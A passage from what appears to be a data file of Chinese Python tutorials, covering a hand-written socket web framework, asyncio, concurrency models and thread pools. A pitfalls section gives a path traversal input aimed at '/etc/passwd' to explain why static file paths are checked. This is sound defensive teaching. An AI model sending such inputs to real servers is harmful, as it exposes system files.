                        epoll.register(client_sock.fileno(), select.EPOLLIN)
                        fd_to_sock[client_sock.fileno()] = client_sock
                        buffers[client_sock.fileno()] = b''
                    
                    elif event & select.EPOLLIN:
                        # 接收数据
                        try:
                            chunk = sock.recv(4096)
                        except:
                            chunk = b''
                        
                        if not chunk:
                            # 连接关闭
                            self._close_connection(epoll, fd_to_sock, buffers, fd, sock)
                            continue
                        
                        buffers[fd] += chunk
                        
                        # 循环尝试解析完整请求（可能有多个请求在缓冲区中）
                        while True:
                            request, parsed_len = parse_http_request(buffers[fd])
                            if request is None:
                                break  # 请求不完整，等待更多数据
                            
                            # 处理请求
                            response = self.handle_request(request)
                            response_bytes = response.to_bytes()
                            
                            try:
                                sock.sendall(response_bytes)
                            except:
                                pass
                            
                            # 移除已解析的数据
                            buffers[fd] = buffers[fd][parsed_len:]
                            
                            # Connection: close时关闭连接
                            if request.headers.get('connection', '').lower() == 'close':
                                self._close_connection(epoll, fd_to_sock, buffers, fd, sock)
                                break
        
        finally:
            epoll.close()
            server_sock.close()
    
    def _close_connection(self, epoll, fd_to_sock, buffers, fd, sock):
        """清理连接"""
        epoll.unregister(fd)
        sock.close()
        del fd_to_sock[fd]
        if fd in buffers:
            del buffers[fd]
\`\`\`

## 五、使用示例

现在用我们写的MiniWeb框架来构建一个简单的Web应用：

\`\`\`python
import json

app = MiniWeb()

# 首页
@app.get('/')
def index(request):
    html = '''<!DOCTYPE html>
<html>
<head><title>MiniWeb</title></head>
<body>
<h1>欢迎来到MiniWeb！</h1>
<p>这是一个用Python socket手写的微型Web框架</p>
<ul>
<li><a href="/hello?name=World">/hello?name=World</a></li>
<li><a href="/json">/json (JSON响应)</a></li>
<li>POST /echo 回显请求体</li>
</ul>
</body>
</html>'''
    return HTTPResponse(html, content_type='text/html; charset=utf-8')

# 带参数的路由
@app.get('/hello')
def hello(request):
    name = request.query.get('name', 'Guest')
    return HTTPResponse(f'Hello, {name}!')

# 返回JSON
@app.get('/json')
def json_demo(request):
    data = {
        'message': 'Hello from MiniWeb',
        'method': request.method,
        'path': request.path,
        'headers': dict(request.headers)
    }
    return HTTPResponse(data)  # 自动序列化为JSON

# POST接口
@app.post('/echo')
def echo(request):
    body = request.body.decode('utf-8')
    try:
        json_body = json.loads(body)
        return HTTPResponse({'received': json_body})
    except:
        return HTTPResponse(f'Received text: {body}')

# 简单的日志中间件
def log_middleware(request):
    print(f'{request.method} {request.path}')
    return None  # 返回None继续处理，返回Response则直接返回

app.add_middleware(log_middleware)

if __name__ == '__main__':
    app.run(port=8080)
\`\`\`

**测试我们的服务器：**

\`\`\`bash
# 启动服务器
python miniweb.py

# 在另一个终端测试
curl http://localhost:8080/
curl "http://localhost:8080/hello?name=Python"
curl http://localhost:8080/json
curl -X POST http://localhost:8080/echo -d '{"test": 123}' -H "Content-Type: application/json"
\`\`\`

## 六、静态文件服务

给我们的框架添加静态文件服务功能：

\`\`\`python
import os
import mimetypes

class MiniWeb:
    # ... 之前的代码 ...
    
    def serve_static(self, static_dir: str):
        """配置静态文件目录"""
        self.static_dir = os.path.abspath(static_dir)
    
    def handle_request(self, request: HTTPRequest) -> HTTPResponse:
        # URL解码
        request.path = unquote(request.path)
        
        # 静态文件服务
        if self.static_dir and request.path.startswith('/static/'):
            file_path = request.path[len('/static/'):]
            full_path = os.path.join(self.static_dir, file_path)
            # 防止路径穿越攻击
            full_path = os.path.abspath(full_path)
            if not full_path.startswith(self.static_dir):
                return HTTPResponse('403 Forbidden', status=403)
            if os.path.isfile(full_path):
                try:
                    with open(full_path, 'rb') as f:
                        content = f.read()
                    content_type, _ = mimetypes.guess_type(full_path)
                    content_type = content_type or 'application/octet-stream'
                    return HTTPResponse(content, content_type=content_type)
                except:
                    return HTTPResponse('500 Internal Server Error', status=500)
            else:
                return HTTPResponse('404 Not Found', status=404)
        
        # ... 其余路由处理代码 ...
\`\`\`

## 七、从这个实现我们能学到什么

通过从零实现一个HTTP服务器和微型框架，我们理解了Web框架的核心本质：

| Web框架功能 | 底层原理 |
|------------|---------|
| 路由系统 | 字典/正则匹配URL路径和方法 |
| 请求对象 | 解析字节流→封装成对象 |
| 响应对象 | 构造状态行+头部+Body→序列化为字节流 |
| 中间件 | 请求处理前后的钩子函数链 |
| 视图函数 | 用户注册的回调函数，接收Request返回Response |
| 服务器 | Socket监听+epoll多路复用+循环解析请求 |

Flask、Django这些成熟框架在本质上做的事情是一样的，只是：
- 路由更强大（支持正则、参数提取、蓝图）
- Request/Response对象更完善（Session、Cookie、文件上传）
- 有完整的中间件/中间件管道
- ORM、模板引擎、表单验证等生态组件
- WSGI/ASGI服务器（Gunicorn/Uvicorn）替代我们的简单epoll服务器

## 八、常见坑点

### 坑点1：recv()不能保证一次接收到完整请求
TCP是流协议，必须在应用层维护接收缓冲区，循环接收直到解析出完整请求。

### 坑点2：编码问题
HTTP头部默认使用latin-1编码（虽然实际大多是ASCII），Body的编码由Content-Type的charset指定。

### 坑点3：路径穿越漏洞
处理静态文件时如果不做路径校验，攻击者可能通过\`/../../../etc/passwd\`访问敏感文件，必须检查规范化后的路径是否在静态目录内。

### 坑点4：Content-Length错误
必须正确设置Content-Length，否则浏览器会一直等待数据或者截断响应。

## 九、面试常见问题

**Q: 你能简单说一下一个HTTP请求从发送到响应的完整过程吗？**
A: （基于我们的实现回答）浏览器解析URL→DNS→TCP三次握手→构造HTTP请求字节流→发送→服务器接收数据→解析请求行/头部/Body→路由匹配→调用视图函数→构造响应→序列化字节流→发送回客户端→浏览器解析渲染→可能TCP四次挥手。

**Q: Web框架的本质是什么？**
A: 本质是Socket服务器+协议解析器+路由分发器+请求响应封装。框架帮你处理了底层网络通信和协议解析，让你专注于业务逻辑。

**Q: WSGI是什么？为什么需要WSGI？**
A: WSGI是Python Web服务器网关接口（PEP3333），是Web服务器和Web应用之间的标准协议。它解耦了服务器和应用框架：Gunicorn/uWSGI等服务器负责网络通信，Flask/Django等框架负责业务逻辑，任何符合WSGI的框架都能运行在任何符合WSGI的服务器上。
`,
  },
  {
    id: "pyb-3-4",
    group: "Python网络编程",
    icon: "🔌",
    title: "Python异步IO",
    content: `# Python异步IO

## 一、异步IO概述

### 1.1 为什么需要异步IO

在传统的同步编程模型中，当程序执行IO操作（网络请求、文件读写、数据库查询）时，线程会被阻塞，等待IO完成，这段时间CPU处于空闲状态。对于高并发网络应用来说，这种等待是巨大的浪费：

- 一个线程同一时间只能处理一个请求
- 大量线程会带来线程创建、上下文切换的开销
- 操作系统能支持的线程数量有限

异步IO的核心思想：**在等待IO的时间段内，不让线程闲着，而是去执行其他任务，等IO就绪了再回来继续处理。**

### 1.2 异步IO vs 同步IO

| 模型 | 线程数 | 阻塞情况 | CPU利用率 | 编程复杂度 | 适合场景 |
|------|--------|---------|-----------|-----------|---------|
| 同步阻塞 | 多线程/多进程 | 阻塞等待IO | 低 | 低 | 低并发、简单业务 |
| 异步非阻塞 | 单线程（少量线程） | IO等待时切换任务 | 高 | 高 | 高并发、IO密集型 |

### 1.3 asyncio简介

\`asyncio\`是Python 3.4引入的标准库，Python 3.5/3.6/3.7不断完善，提供了基于协程的异步IO编程框架：

- 单线程并发处理数千个连接
- 使用async/await语法，代码接近同步写法
- 内置事件循环、协程、任务、Future等核心抽象
- 支持TCP/UDP/SSL/子进程/信号等

## 二、核心概念

### 2.1 协程(Coroutine)

协程是比线程更轻量级的"用户态线程"：
- 协程切换在用户态完成，没有内核态切换开销
- 协程的调度完全由用户控制（事件循环调度）
- 一个线程中可以同时存在数万个协程
- 协程只有在遇到await关键字时才会切换

**定义协程函数：**

\`\`\`python
import asyncio

# async def 定义协程函数
async def hello(name):
    print(f'Hello, {name}!')
    # await 等待另一个协程/可等待对象
    await asyncio.sleep(1)
    print(f'Goodbye, {name}!')
    return f'Result from {name}'

# 调用协程函数不会直接执行，而是返回一个协程对象
coro = hello('Python')
print(type(coro))  # <class 'coroutine'>

# 需要在事件循环中运行
asyncio.run(coro)
\`\`\`

### 2.2 事件循环(Event Loop)

事件循环是异步IO的核心调度器：
1. 循环等待事件发生（IO就绪、定时器到期等）
2. 将事件分发到对应的回调函数/协程
3. 调度协程的运行与切换

\`\`\`python
import asyncio

# 获取当前事件循环
loop = asyncio.get_event_loop()

# 运行协程直到完成（Python3.7+简化为asyncio.run()）
# loop.run_until_complete(coro)

# 永久运行事件循环
# loop.run_forever()

# 关闭事件循环
# loop.close()

# 推荐方式(Python3.7+)
async def main():
    print('在事件循环中运行')
    
asyncio.run(main())
\`\`\`

### 2.3 Task任务

Task用来并发调度协程，将协程包装成任务后它会自动被事件循环调度执行：

\`\`\`python
import asyncio
import time

async def say_after(delay, what):
    await asyncio.sleep(delay)
    print(what)
    return what

async def main():
    # 1. 顺序执行（总耗时2+1=3秒）
    start = time.time()
    await say_after(2, 'hello')
    await say_after(1, 'world')
    print(f'顺序执行耗时: {time.time() - start:.2f}s')
    
    # 2. 使用Task并发执行（总耗时约max(2,1)=2秒）
    start = time.time()
    task1 = asyncio.create_task(say_after(2, 'hello'))
    task2 = asyncio.create_task(say_after(1, 'world'))
    await task1
    await task2
    print(f'并发执行耗时: {time.time() - start:.2f}s')

asyncio.run(main())
\`\`\`

### 2.4 async/await语法规则

**async def 定义协程函数**
- 协程函数内部可以使用\`await\`、\`return\`、\`yield\`（异步生成器）

**await 表达式**
- \`await\`后面只能跟"可等待对象"(awaitable)：协程对象、Task、Future
- 遇到\`await\`时，当前协程暂停，事件循环去执行其他任务
- 等到await的对象完成后，当前协程恢复执行，拿到返回值
- **await只能在async def函数内部使用**

## 三、asyncio实战

### 3.1 异步TCP服务器

使用asyncio实现高并发Echo服务器：

\`\`\`python
import asyncio

async def handle_client(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    """处理客户端连接（协程）"""
    addr = writer.get_extra_info('peername')
    print(f'新连接: {addr}')
    
    try:
        while True:
            # await等待数据到来，不阻塞事件循环
            data = await reader.read(4096)
            if not data:
                break
            
            message = data.decode('utf-8')
            print(f'收到 {addr}: {message}')
            
            response = f'Echo: {message}'.encode('utf-8')
            writer.write(response)
            await writer.drain()  # 等待数据发送完成
    
    except asyncio.CancelledError:
        pass
    except Exception as e:
        print(f'客户端 {addr} 错误: {e}')
    finally:
        print(f'连接关闭: {addr}')
        writer.close()
        await writer.wait_closed()

async def main():
    # start_server创建异步TCP服务器
    server = await asyncio.start_server(
        handle_client,
        '0.0.0.0',
        8080
    )
    
    addrs = ', '.join(str(sock.getsockname()) for sock in server.sockets)
    print(f'异步TCP服务器运行中: {addrs}')
    
    # 永久运行
    async with server:
        await server.serve_forever()

if __name__ == '__main__':
    asyncio.run(main())
\`\`\`

### 3.2 异步HTTP客户端

使用asyncio和aiohttp实现高并发HTTP请求：

\`\`\`python
import asyncio
import aiohttp  # 需要安装: pip install aiohttp
import time

async def fetch(session: aiohttp.ClientSession, url: str) -> tuple:
    """异步获取单个URL"""
    start = time.time()
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            status = resp.status
            content = await resp.text()
            elapsed = time.time() - start
            print(f'[{status}] {url} - {len(content)} bytes - {elapsed:.2f}s')
            return url, status, len(content)
    except Exception as e:
        elapsed = time.time() - start
        print(f'[ERROR] {url} - {e} - {elapsed:.2f}s')
        return url, str(e), 0

async def fetch_all(urls: list, concurrency: int = 10):
    """并发获取多个URL，限制并发数"""
    # 使用Semaphore限制并发数，防止瞬间创建太多连接
    semaphore = asyncio.Semaphore(concurrency)
    
    async def fetch_with_limit(url):
        async with semaphore:
            async with aiohttp.ClientSession() as session:
                return await fetch(session, url)
    
    tasks = [fetch_with_limit(url) for url in urls]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return results

async def main():
    # 测试URL列表
    urls = [
        'https://www.baidu.com',
        'https://www.taobao.com',
        'https://www.jd.com',
        'https://www.bilibili.com',
        'https://www.zhihu.com',
        'https://httpbin.org/delay/1',
        'https://httpbin.org/delay/2',
        'https://httpbin.org/delay/3',
    ] * 3  # 重复3次，共24个请求
    
    start = time.time()
    
    # 并发执行，最大并发数10
    results = await fetch_all(urls, concurrency=10)
    
    total_time = time.time() - start
    success = sum(1 for r in results if not isinstance(r, Exception) and isinstance(r[1], int))
    print(f'\\n总计: {len(urls)}个请求，成功{success}个，总耗时{total_time:.2f}s')
    print(f'平均每个请求耗时: {total_time/len(urls):.2f}s')

if __name__ == '__main__':
    asyncio.run(main())
\`\`\`

**对比同步请求：**
- 同步方式：24个请求×平均1秒/个 ≈ 24秒
- 异步方式：约max(1,2,3)+其他 ≈ 3-4秒
- 性能提升约6-8倍！

### 3.3 异步定时器

\`\`\`python
import asyncio

async def periodic_task(name, interval):
    """周期性任务"""
    while True:
        print(f'[{name}] 执行任务...')
        await asyncio.sleep(interval)

async def delay_task(name, delay):
    """延迟执行任务"""
    await asyncio.sleep(delay)
    print(f'[{name}] 延迟{delay}秒后执行')

async def main():
    # 创建多个并发任务
    task1 = asyncio.create_task(periodic_task('每2秒任务', 2))
    task2 = asyncio.create_task(periodic_task('每3秒任务', 3))
    task3 = asyncio.create_task(delay_task('一次性任务', 5))
    
    # 等待一次性任务完成
    await task3
    print('一次性任务完成')
    
    # 取消周期性任务
    task1.cancel()
    task2.cancel()
    
    try:
        await task1
        await task2
    except asyncio.CancelledError:
        print('周期性任务已取消')

asyncio.run(main())
\`\`\`

## 四、异步上下文管理器与异步迭代器

### 4.1 异步上下文管理器

使用\`async with\`管理异步资源：

\`\`\`python
import asyncio

class AsyncDatabaseConnection:
    def __init__(self, db_name):
        self.db_name = db_name
    
    async def __aenter__(self):
        # 异步建立连接
        print(f'连接到数据库 {self.db_name}...')
        await asyncio.sleep(0.5)
        self.conn = {'db': self.db_name, 'connected': True}
        return self.conn
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        # 异步关闭连接
        print(f'关闭数据库连接 {self.db_name}...')
        await asyncio.sleep(0.2)
        self.conn['connected'] = False
        return False  # 不吞异常

async def main():
    async with AsyncDatabaseConnection('mydb') as conn:
        print(f'已连接: {conn}')
        await asyncio.sleep(1)
        print('执行数据库操作...')

asyncio.run(main())
\`\`\`

### 4.2 异步迭代器

使用\`async for\`迭代异步数据流：

\`\`\`python
import asyncio

class AsyncRange:
    """异步range迭代器"""
    def __init__(self, start, end, delay=0.1):
        self.current = start
        self.end = end
        self.delay = delay
    
    def __aiter__(self):
        return self
    
    async def __anext__(self):
        if self.current >= self.end:
            raise StopAsyncIteration
        await asyncio.sleep(self.delay)
        value = self.current
        self.current += 1
        return value

async def main():
    async for i in AsyncRange(0, 5, delay=0.5):
        print(f'收到: {i}')

asyncio.run(main())
\`\`\`

## 五、异步Socket底层操作

asyncio也可以直接操作底层的异步socket：

\`\`\`python
import asyncio
import socket

async def async_socket_demo():
    # 获取事件循环
    loop = asyncio.get_running_loop()
    
    # 创建普通socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setblocking(False)
    
    # 异步连接（不会阻塞）
    try:
        await loop.sock_connect(sock, ('example.com', 80))
    except Exception as e:
        print(f'连接失败: {e}')
        return
    
    # 构造HTTP请求
    request = b'GET / HTTP/1.1\\r\\nHost: example.com\\r\\nConnection: close\\r\\n\\r\\n'
    
    # 异步发送
    await loop.sock_sendall(sock, request)
    
    # 异步接收
    response = b''
    while True:
        chunk = await loop.sock_recv(sock, 4096)
        if not chunk:
            break
        response += chunk
    
    print(response.decode('latin-1')[:500])
    sock.close()

asyncio.run(async_socket_demo())
\`\`\`

## 六、最佳实践与常见坑点

### ✅ 最佳实践

1. **合理使用并发限制**：使用Semaphore控制并发数，避免把对方服务打垮
2. **正确处理异常**：使用try/except捕获协程中的异常，gather时用return_exceptions=True
3. **永远不要在协程中调用阻塞调用**：time.sleep()、requests.get()、open()大文件等会阻塞整个事件循环！
   - 用\`asyncio.sleep()\`替代\`time.sleep()\`
   - 用\`aiohttp\`替代\`requests\`
   - 用\`aiofiles\`替代同步文件操作
   - 阻塞操作放到线程池中运行：\`await loop.run_in_executor(None, blocking_func)\`

### ❌ 常见坑点

**坑点1：协程忘记await，直接调用**
\`\`\`python
async def bad():
    asyncio.sleep(1)  # ❌ 没有await，什么都不做，还会报RuntimeWarning
    print('sleep完成？不，其实没有sleep！')
\`\`\`

**坑点2：在协程中使用阻塞IO**
\`\`\`python
import time
import requests

async def bad():
    time.sleep(1)  # ❌ 阻塞整个事件循环，所有协程都被卡住
    requests.get('https://example.com')  # ❌ 同样阻塞

async def good():
    await asyncio.sleep(1)  # ✅ 异步等待，不阻塞
    async with aiohttp.ClientSession() as s:
        await s.get('https://example.com')  # ✅ 异步HTTP
\`\`\`

**坑点3：create_task后没保存引用，任务可能被垃圾回收**
\`\`\`python
async def bad():
    asyncio.create_task(some_coro())  # ❌ 如果没await，task可能被GC销毁
    # ... 做其他事 ...

async def good():
    task = asyncio.create_task(some_coro())  # ✅ 保存引用
    # ...
    await task  # ✅ 等待任务完成
\`\`\`

## 七、面试常见问题

**Q: 协程和线程的区别？**
A: 1）线程是内核态调度，协程是用户态调度，协程切换开销极小；2）一个线程可以有上万个协程，但线程数量通常最多几百个；3）协程是协作式调度（await时切换），线程是抢占式调度；4）协程不需要锁（单线程内不存在数据竞争，但多进程/多线程+协程仍需注意）。

**Q: asyncio的事件循环是如何工作的？**
A: 事件循环本质是一个while循环：不断从就绪队列取出任务执行，遇到await IO时将任务挂起，注册IO回调；当IO就绪时（epoll通知），把对应任务放回就绪队列继续执行。同时管理定时器、信号、子进程等事件。

**Q: 异步IO为什么快？什么场景下异步没优势？**
A: 异步IO快在IO等待时不浪费CPU，用单线程处理大量并发连接，省去线程切换开销。但CPU密集型任务异步没优势，因为协程单线程运行，无法利用多核，CPU密集任务应该用多进程。

**Q: async def里面能不能写time.sleep()？有什么问题？**
A: 能写但绝对不要写！time.sleep()是阻塞调用，会阻塞整个事件循环线程，导致这期间所有其他协程、所有IO都无法处理，整个服务卡住。必须用await asyncio.sleep()。
`,
  },
  {
    id: "pyb-3-5",
    group: "Python网络编程",
    icon: "🔌",
    title: "并发编程模型对比",
    content: `# 并发编程模型对比

## 一、并发与并行

在深入模型之前，先区分两个关键概念：

- **并发（Concurrency）**：宏观上多个任务"同时"推进，微观上可能是交替执行。单核CPU也可以实现并发。
- **并行（Parallelism）**：微观上真的在同一时刻执行多个任务，需要多核CPU硬件支持。

| 概念 | 关键 | 依赖 | 目标 |
|------|------|------|------|
| 并发 | 任务交替执行 | 不需要多核 | 提高资源利用率、提升响应性 |
| 并行 | 任务同时执行 | 需要多核 | | 利用多核CPU、提升计算速度 |

## 二、Python中的三种并发模型

Python中实现并发编程主要有三种方式：多进程、多线程、协程（异步IO）。

### 2.1 核心特性对比

| 特性 | 多进程(Multiprocessing) | 多线程(Threading) | 协程(Asyncio) |
|------|------------------------|-------------------|---------------|
| 调度者 | 操作系统内核 | 操作系统内核 | 用户态事件循环 |
| 切换开销 | 大（几微秒~几十微秒，涉及内核态） | 中（约1微秒） | 极小（几十纳秒，用户态） |
| 并发数量 | 低（几十~几百个） | 中（几百~几千个） | 极高（几万~几十万个） |
| 数据共享 | 复杂（需要IPC：管道/队列/共享内存） | 简单（共享地址空间，需要锁） | 简单（单线程共享内存，无竞争） |
| GIL影响 | 无（每个进程独立GIL） | 有（同一时刻只有一个线程执行Python字节码） | 无（单线程不受GIL影响） |
| 多核利用 | ✅ 可以利用多核 | ❌ CPU密集型无法利用多核 | ❌ 单线程无法利用多核 |
| 编程复杂度 | 中高（进程间通信复杂） | 中（需要处理锁、死锁等问题） | 高（异步思维，生态需支持异步） |
| 稳定性 | 高（进程隔离，一个崩溃不影响其他） | 中（一个线程崩溃可能导致整个进程崩溃） | 中（协程崩溃需捕获，否则事件循环终止） |
| 适用场景 | CPU密集型计算 | IO密集型（有阻塞IO） | 高并发IO密集型（网络服务） |

### 2.2 图解执行模型

**多进程模型：**
\`\`\`
CPU核心1: [进程1执行]
CPU核心2: [进程2执行]
CPU核心3: [进程3执行]
CPU核心4: [进程4执行]
每个进程有独立的内存空间和GIL
\`\`\`

**多线程模型（受GIL影响）：**
\`\`\`
进程内（单GIL）:
线程1执行 ██░░░░██░░░░██░░░░
线程2执行 ░░░░██░░░░██░░░░██
线程3执行 ░░░░░░░░██░░░░██░░
同一时刻只有一个线程持有GIL在执行，其他等待
IO等待时释放GIL
\`\`\`

**协程模型：**
\`\`\`
单线程内事件循环:
协程A执行 ████░░░░░░████░░░░
协程B执行 ░░░░░░████░░░░░░██
协程C执行 ░░░░░░░░░░████░░░
遇到await(IO等待)时主动让出控制权，切换到其他协程
全程单线程，无GIL竞争
\`\`\`

## 三、GIL全局解释器锁

### 3.1 什么是GIL

GIL（Global Interpreter Lock）是CPython解释器中的一把全局互斥锁，**它保证同一时刻只有一个线程在执行Python字节码**。这是Python历史设计决策，主要原因：
- CPython的内存管理（引用计数）不是线程安全的
- 早期CPython为了简化实现、避免复杂的细粒度锁
- C扩展生态很多依赖GIL，移除GIL会导致大量兼容问题

### 3.2 GIL的影响

| 场景 | GIL的影响 |
|------|----------|
| CPU密集型多线程 | ❌ 灾难！多线程实际上在单核上交替执行，比单线程还慢（有切换开销） |
| IO密集型多线程 | ✅ 影响不大！IO等待时GIL会被释放，其他线程可以执行 |
| 多进程 | ✅ 无影响！每个进程有独立的GIL |
| 协程(单线程) | ✅ 无影响！本来就单线程执行 |

### 3.3 GIL释放时机

- **IO等待时**：执行\`read()/write()/recv()/send()/sleep()\`等阻塞系统调用前会释放GIL
- **超时释放**：Python3.2后每隔一定时间（默认5毫秒）会释放并重新获取GIL，让其他线程有机会执行
- **执行C扩展时**：C扩展可以主动释放GIL（如numpy做计算时）

### 3.4 代码演示：GIL对CPU密集型的影响

\`\`\`python
import time
import threading
import multiprocessing

def cpu_bound(n):
    """CPU密集型任务：计算累加"""
    total = 0
    for i in range(n):
        total += i * i
    return total

def benchmark(executor_class, n_workers, n=10_000_000):
    """测试并发执行CPU密集任务"""
    start = time.time()
    
    if executor_class == 'single':
        for _ in range(n_workers):
            cpu_bound(n)
    elif executor_class == 'thread':
        threads = []
        for _ in range(n_workers):
            t = threading.Thread(target=cpu_bound, args=(n,))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
    elif executor_class == 'process':
        processes = []
        for _ in range(n_workers):
            p = multiprocessing.Process(target=cpu_bound, args=(n,))
            processes.append(p)
            p.start()
        for p in processes:
            p.join()
    
    elapsed = time.time() - start
    print(f'{executor_class} ({n_workers} workers): {elapsed:.2f}s')
    return elapsed

if __name__ == '__main__':
    # 单线程基准
    benchmark('single', 4)      # 例如约 2.0s
    # 多线程（因为GIL，可能比单线程还慢！）
    benchmark('thread', 4)      # 例如约 2.3s
    # 多进程（真正并行，约为单线程的1/4时间）
    benchmark('process', 4)     # 例如约 0.6s
\`\`\`

**结果分析：**
- 单线程4次循环：约2.0秒
- 4线程：约2.3秒（更慢！因为GIL+线程切换开销）
- 4进程：约0.6秒（真正并行在4核上，快了约3.3倍）

### 3.5 代码演示：IO密集型场景

\`\`\`python
import time
import threading
import multiprocessing
import asyncio
import aiohttp

def io_bound_sync(url):
    """同步IO请求"""
    import requests
    return requests.get(url, timeout=10).status_code

async def io_bound_async(url, session):
    """异步IO请求"""
    async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
        return resp.status

# 测试：20个HTTP请求
urls = ['https://httpbin.org/delay/1'] * 20  # 每个请求延迟1秒

# 1. 单线程同步
def bench_sync():
    start = time.time()
    for url in urls:
        io_bound_sync(url)
    print(f'单线程同步: {time.time()-start:.2f}s')

# 2. 多线程
def bench_thread():
    start = time.time()
    threads = [threading.Thread(target=io_bound_sync, args=(url,)) for url in urls]
    for t in threads: t.start()
    for t in threads: t.join()
    print(f'20线程: {time.time()-start:.2f}s')

# 3. 多进程
def bench_process():
    start = time.time()
    # 多进程做IO开销大，通常不推荐
    with multiprocessing.Pool(8) as pool:
        pool.map(io_bound_sync, urls)
    print(f'8进程: {time.time()-start:.2f}s')

# 4. 异步asyncio
async def bench_async():
    start = time.time()
    async with aiohttp.ClientSession() as session:
        tasks = [io_bound_async(url, session) for url in urls]
        await asyncio.gather(*tasks)
    print(f'asyncio协程: {time.time()-start:.2f}s')

if __name__ == '__main__':
    bench_sync()          # ~20秒（顺序执行）
    bench_thread()        # ~2秒（线程并发）
    bench_process()       # ~3-4秒（进程开销大）
    asyncio.run(bench_async())  # ~1.5秒（协程高并发）
\`\`\`

## 四、如何选型：CPU密集 vs IO密集

### 4.1 判断任务类型

**CPU密集型任务（计算密集型）：**
- 特点：大部分时间在做计算、使用CPU
- 例子：数值计算、图像处理、视频编码、密码破解、机器学习训练、复杂算法
- ✅ 推荐模型：**多进程**（利用多核）
- ❌ 不推荐：多线程（GIL导致无法并行）、协程（单线程无法利用多核）

**IO密集型任务：**
- 特点：大部分时间在等待IO操作完成（网络、磁盘、数据库）
- 例子：Web服务、API网关、爬虫、消息队列消费、数据库代理
- ✅ 高并发推荐：**协程(asyncio)**（极高并发、低开销）
- ✅ 中等并发：**多线程**（编程简单，生态兼容好）
- ❌ 不推荐：多进程（进程创建开销大，大量进程资源消耗高）

### 4.2 选型决策树

\`\`\`
任务类型？
├── CPU密集型 → 多进程 (multiprocessing / ProcessPoolExecutor)
│   └── 如果有大量C扩展释放GIL(numpy等) → 多线程也可以
└── IO密集型
    ├── 并发要求极高(>1000连接/秒)？ → 协程(asyncio + aiohttp/uvicorn/FastAPI)
    ├── 生态有很多阻塞库？ → 多线程 (threading / ThreadPoolExecutor)
    └── 并发量不大，追求简单 → 多线程
\`\`\`

### 4.3 混合模型：多进程+协程

最优架构往往是混合模型：
- **Nginx/负载均衡层** → 分发请求
- **多进程（每个CPU核心一个进程）** → 利用多核
  - **每个进程内用协程(asyncio)** → 单进程处理高并发

典型例子：
- **Gunicorn + Uvicorn/FastAPI**：Gunicorn管理多个Uvicorn进程，每个Uvicorn进程内asyncio协程处理请求
- **Sanic**：多worker模式，每个worker异步处理

\`\`\`python
# 启动命令示例：4个进程，每个进程内asyncio处理并发
# gunicorn main:app -w 4 -k uvicorn.workers.UvicornWorker -b 0.0.0.0:8000
\`\`\`

## 五、不同模型的代码复杂度对比

### 5.1 计数器问题：多线程需要锁

\`\`\`python
import threading

counter = 0
lock = threading.Lock()

def increment(n):
    global counter
    for _ in range(n):
        # 多线程修改共享变量必须加锁，否则会有竞态条件
        with lock:
            counter += 1

threads = [threading.Thread(target=increment, args=(100000,)) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()
print(f'计数器: {counter}')  # 正确结果1000000，不加锁结果会小于它
\`\`\`

### 5.2 多进程需要进程间通信

\`\`\`python
import multiprocessing

def worker(queue, n):
    total = 0
    for i in range(n):
        total += i
    queue.put(total)  # 通过队列通信

if __name__ == '__main__':
    q = multiprocessing.Queue()
    processes = [multiprocessing.Process(target=worker, args=(q, 1000000)) for _ in range(4)]
    for p in processes: p.start()
    
    results = [q.get() for _ in processes]
    for p in processes: p.join()
    print(f'各进程结果: {results}, 总和: {sum(results)}')
\`\`\`

### 5.3 协程不需要锁（单线程内）

\`\`\`python
import asyncio

counter = 0  # 单线程内没有竞态条件，不需要锁

async def increment(n):
    global counter
    for _ in range(n):
        counter += 1
        await asyncio.sleep(0)  # 让出控制权，但计数仍然安全

async def main():
    tasks = [increment(100000) for _ in range(10)]
    await asyncio.gather(*tasks)
    print(f'计数器: {counter}')  # 正确结果1000000

asyncio.run(main())
\`\`\`

## 六、常见坑点

### 坑点1：CPU密集任务用了多线程
因为GIL的存在，CPU密集任务多线程反而比单线程慢，必须用多进程。

### 坑点2：多进程间共享数据用普通全局变量
进程地址空间隔离，全局变量在每个进程中有独立副本，修改互不影响，必须用Queue/Pipe/Manager/shared_memory等IPC机制。

### 坑点3：混合线程/协程时在协程中用阻塞调用
asyncio单线程内如果调用了requests/time.sleep等阻塞方法，会卡住整个事件循环，所有协程都无法运行。

### 坑点4：进程池/线程池大小设置不合理
- CPU密集型：进程池大小 = CPU核心数（或+1）
- IO密集型：线程池大小可以设大一些，比如 CPU核心数 * 2 到 CPU核心数 * 5，但不是越大越好，线程切换也有开销。

## 七、面试常见问题

**Q: Python为什么有GIL？GIL有什么影响？**
A: GIL是CPython为了简化内存管理（引用计数线程安全）和C扩展兼容而保留的全局锁。它导致CPU密集型多线程无法利用多核，反而更慢；但对IO密集型影响不大，因为IO等待时GIL释放。CPU密集场景用多进程绕过GIL。

**Q: 什么时候用多线程、什么时候用多进程、什么时候用协程？**
A: CPU密集用多进程；IO密集且并发量不大、代码简单用多线程；高并发IO密集（如Web服务、高并发爬虫）用协程asyncio，性能最好。生产环境常用多进程+协程混合模型。

**Q: 多线程一定比单线程快吗？**
A: 不一定。CPU密集任务因为GIL多线程更慢；线程太多时切换开销增大也可能变慢；IO密集任务并发请求时多线程/协程明显更快。

**Q: 为什么协程不需要锁？那asyncio为什么还有Lock？**
A: 纯单线程协程不需要锁，因为协程只有在await点才切换，只要不在await期间修改共享数据就不会有竞态。但如果协程和多线程结合，或者多个协程在await点之间仍有临界区操作（虽然罕见），asyncio.Lock用于协程间的同步。
`,
  },
  {
    id: "pyb-3-6",
    group: "Python网络编程",
    icon: "🔌",
    title: "线程池与进程池",
    content: `# 线程池与进程池

## 一、为什么需要池化技术

如果每次有任务都创建新的线程/进程，会带来显著问题：
- **创建/销毁开销大**：系统调用，分配内核资源、栈空间等
- **管理困难**：大量线程/进程难以监控和管理
- **资源耗尽风险**：无限制创建会导致系统内存耗尽、CPU过载
- **上下文切换严重**：线程/进程过多时，大量时间浪费在切换上

